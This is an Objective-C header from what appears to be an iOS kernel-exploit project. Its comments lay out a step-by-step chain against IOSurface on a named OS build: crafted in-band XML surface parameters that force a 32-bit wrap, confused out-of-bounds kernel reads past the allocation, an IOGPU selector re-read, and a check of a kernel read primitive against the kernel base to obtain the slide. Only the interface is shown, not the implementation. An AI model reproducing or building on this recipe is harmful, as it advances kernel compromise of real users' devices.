//
//  P176F1SeedWindow.h — the F1-seed confused-window calib (p176). LightSword on 24B156/27.2.1.
//  Seed geometry credit murk-sus (F1OOB-PoC, MIT); window conversion is the LightSword lane (ours).
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface P176F1SeedWindow : NSObject
/// Chain (27.2.1 daily driver, door receipts p018 v3):
///   1. IOSurfaceRoot open (kr=0 receipts)
///   2. F1 surface via sel 0 IN-BAND XML (murk recipe: alloc 0x10000, slices 4,
///      dataPerSlice 0x4000, headerPerSlice 0x40000000 → 32-bit wrap; in-band limit 0x1000)
///   3. field readback (sliceCount/headerPerSlice/dataPerSlice + sid @info+0x18)
///   4. per-window confused read on the F1 sid: 16 windows × 8 probes at +64 KiB offsets
///      past the alloc — a NON-Marker qword at offset>0x10000 = the kernel-side OOB read
///      receipt on 27.2.1 (the 4 GiB logical/64 KiB backing law).
///   5. sel36 {id,0,0x1000} IOGPU read re-run on the F1 id (p018's 0x11d33 law, F1-crossed).
/// PANIC-POSSIBLE (kernel window confusion); one tap per force-quit; fresh boot law.
/// hasKread flips ONLY via kread32(kbase)==0xfeedfacf (commitSlide); hits are receipt-class.
+ (NSString *)tap;
@end

NS_ASSUME_NONNULL_END
